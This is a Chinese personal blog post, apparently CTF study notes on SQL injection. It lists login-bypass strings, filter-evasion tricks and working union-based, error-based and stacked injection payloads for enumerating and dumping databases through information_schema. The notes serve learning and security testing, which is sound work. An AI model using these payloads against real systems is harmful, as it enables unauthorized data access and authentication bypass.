@@ -1,0 +1,400 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>sql注入 | 遗世独立の幻想乡</title>
+        <meta name="author" content="CloudFlowing" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+
+        <!-- 页面点击小红心 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+        <!-- 浏览器搞笑标题 -->
+        <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>遗世独立の幻想乡</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;遗世独立の幻想乡</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>sql注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/16
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                学习笔记
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Web/" style="color: #00a596">Web</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入</a></h1><p><a target="_blank" rel="noopener" href="http://sqlwiki.radare.cn/#/injectionTypes/errorBased">wiki</a></p>
+<span id="more"></span>
+
+<h2 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-tutorial.html">SQL语法</a></h2><ul>
+<li><p>从数据库中选取数据</p>
+<p><code>SELECT column_name,column_name FROM table_name;</code>或<br><code>SELECT FROM table_name;</code></p>
+<ul>
+<li><p><code>select distinct</code>语句可用于返回唯一不同的值</p>
+</li>
+<li><p><code>SELECT FROM语句 + where column_name = value;</code>可用于提取满足指定条件的记录</p>
+</li>
+<li><p><code>SELECT FROM语句 + order by column_name(可多列查询 + ,column_name) ASC（升序）|DESC（降序）; </code>对结果集按照一个列或者多个列进行排序</p>
+<p>1‘ order by + 字段数# 用于查询可显示的字段</p>
+</li>
+<li><p><code>SELECT column_name(s) FROM table1 UNION SELECT column_name(s) FROM table2;</code>合并两个或多个 SELECT 语句的结果</p>
+<p>union select</p>
+</li>
+</ul>
+</li>
+<li><p><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code>将相同的行组合起来</p>
+</li>
+<li><p><strong>表示注释</strong>:</p>
+<p>#或%23：post请求中使用</p>
+<p>–+或–%20:get请求中使用（+将被识别为空格）</p>
+</li>
+<li><p><strong>关键字</strong></p>
+<p>database():数据库</p>
+<p>table_name:表名(表名为数字时：要用反引号包起来查询)</p>
+<p>column_name:列名</p>
+<hr>
+</li>
+</ul>
+<h2 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h2><ul>
+<li>原理：使相关语句永真</li>
+</ul>
+<pre><code class="sql">&#39;1&#39;or 1 = 1#
+</code></pre>
+<p><code>ffifdyop</code>：md5加密时使用</p>
+<h2 id="位数长度不足"><a href="#位数长度不足" class="headerlink" title="位数长度不足"></a>位数长度不足</h2><p>使用截断函数</p>
+<ul>
+<li><strong>substr()函数</strong></li>
+</ul>
+<p>​	  <code>substr(string,start,length)</code><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20221207161642898.png" alt="	"></p>
+<ul>
+<li><p><strong>left()函数</strong></p>
+<p>获得源字符串左边的子串</p>
+<p><code>left(string,n)</code></p>
+</li>
+<li><p><strong>right()函数</strong></p>
+<p>获得字符串右边的子串</p>
+<p><code>right(string,n)</code></p>
+</li>
+<li><p><strong>mid()函数</strong></p>
+<p>返回字符串的子串</p>
+<p><code>mid(string,start,length)</code></p>
+</li>
+<li><p><strong>reverse()函数</strong></p>
+</li>
+</ul>
+<hr>
+<h2 id="过滤替换"><a href="#过滤替换" class="headerlink" title="过滤替换"></a>过滤替换</h2><ul>
+<li><p>空格：&#x2F;**&#x2F;</p>
+</li>
+<li><p>等号：like</p>
+</li>
+<li><p>select…where…：</p>
+<ul>
+<li><p>show + datebases &#x2F; tables &#x2F; columns from table </p>
+</li>
+<li><p>将 select * from 列名 进行16进制编码</p>
+</li>
+<li><p><strong>handler</strong>:一行一行显示库中内容</p>
+<pre><code class="sql">handler tablename open as `a`;(`a`为新创建的表)
+handler tablename read;读出什么输出什么
+
+handler tablename read first [where username=‘admin’];
+handler `a` read next [where username=‘admin’]; – [] 中的内容意味着可加可不加
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h2><h2 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h2><ul>
+<li><p>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入（无引号闭合）</p>
+</li>
+<li><p>字符型：当输入的参数被当做字符串时，称为字符型（有引号闭合）</p>
+<hr>
+</li>
+</ul>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><blockquote>
+<p>适用于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</p>
+</blockquote>
+<ul>
+<li><p>步骤</p>
+<p><em>1. 页面观察</em></p>
+<p><em>2. 注入点判断</em></p>
+<p><em>3. 判断当前表的字段个数</em>：</p>
+<pre><code class="sql">?id=1&#39; order by 3 --+
+</code></pre>
+<p><em>4. 判断显示位</em>：判断我们的输入会在屏幕哪个地方进行回显</p>
+<pre><code class="sql">?id=-1&#39; union select 1,2,3 --+
+//=-1&#39;:(让前面的参数查不出来)
+//1,2,3:(总列数)
+//--+(注释)
+</code></pre>
+<p><em>5. 爆数据库名字</em></p>
+<pre><code class="sql">?id=-1&#39; union select 1,database(),3 --+
+//1:(头列数)
+//3:(尾列数)
+</code></pre>
+<p><em>6. 爆数据库中的表</em></p>
+<pre><code class="sql">?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()/&#39;数据库名&#39; --+
+</code></pre>
+<p><em>7. 爆表中的字段</em></p>
+<pre><code class="sql">?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where (table_schema=&#39;数据库名&#39; and)  table_name=&#39;表名&#39; --+
+</code></pre>
+<p><em>8. 爆相应字段的所有数据</em></p>
+<pre><code class="sql">?id=-1&#39; union select 1,group_concat(字段名,&#39;--&#39;,字段名,&#39;--&#39;,字段名),3 from 表名 --+
+</code></pre>
+</li>
+</ul>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
+<li><p><strong>group by 重复键冲</strong></p>
+<p><code>?id=-1&#39; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+ </code></p>
+</li>
+<li><p><strong>extractvalue(目标xml文档，xml路径)函数</strong></p>
+<p>对XML文档进行查询的函数，从目标XML中返回包含所查询值的字符串</p>
+<p><code>?id=-1&#39; and extractvalue(1,concat(&#39;^&#39;,(select (不要加列数) database()),&#39;^&#39;)) --+</code></p>
+</li>
+<li><p><strong>updatexml() 函数</strong></p>
+<p>原理：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就			因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码</p>
+<p>作用: 改变文档中符合条件的节点的值</p>
+<p><code>?id=-1&#39; and updatexml(1,concat(&#39;^&#39;,(需要查询的内容),&#39;^&#39;),1) --+</code></p>
+</li>
+</ul>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul>
+<li><p>使用<code>;</code>执行多条sql语句</p>
+</li>
+<li><p><strong>区别</strong>：联合查询注入只能执行查询语句，堆叠注入可执行任意语句</p>
+</li>
+<li><p><strong>rename…to…语句</strong>:可以重命名改表名，使表名可被直接查询到</p>
+</li>
+<li><p><strong>alter</strong>：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）</p>
+<ul>
+<li><p>添加：</p>
+<p><code>alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</code></p>
+</li>
+<li><p>删除：</p>
+<p><code>alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</code></p>
+</li>
+<li><p>改变数据类型：</p>
+<p><code>alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</code></p>
+</li>
+<li><p>改列名：</p>
+<p><code>alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>编码</strong>(以select * from `1919810931114514`为例)</p>
+<pre><code class="sql">;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
+</code></pre>
+<ul>
+<li>prepare…from…是预处理语句，会进行编码转换</li>
+<li>execute用来执行由SQLPrepare创建的SQL语句</li>
+<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 遗世独立の幻想乡
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;CloudFlowing
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
